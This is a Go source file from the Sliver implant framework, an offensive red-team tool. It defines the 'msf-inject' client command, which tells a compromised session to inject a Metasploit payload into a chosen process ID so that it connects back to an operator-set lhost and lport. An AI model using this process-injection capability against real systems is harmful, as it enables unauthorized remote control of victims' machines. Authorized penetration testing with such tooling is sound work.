package execute

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// MSFInject - Inject an MSF payload into a process.
type MSFInject struct {
	Positional struct {
		PID uint32 `description:"process ID to inject into" required:"1-1"`
	} `positional-args:"yes" required:"yes"`
	MSFOptions `group:"msf options"`
}

// Execute - Inject an MSF payload into a process.
func (m *MSFInject) Execute(args []string) (err error) {

	payloadName := m.Payload
	lhost := m.LHost
	lport := m.LPort
	encoder := m.Encoder
	iterations := m.Iterations

	if lhost == "" {
		return log.Errorf("Invalid lhost '%s', see `help %s`", lhost, constants.MsfStr)
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
		payloadName, core.ActiveTarget.Session.OS, core.ActiveTarget.Session.Arch, lhost, lport)
	go log.SpinUntil(msg, ctrl)
	_, err = transport.RPC.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      uint32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		PID:        m.Positional.PID,
		Request:    core.ActiveTarget.Request(),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		return log.Errorf("%s", err)
	}

	log.Infof("Executed payload on target\n")
	return nil
}
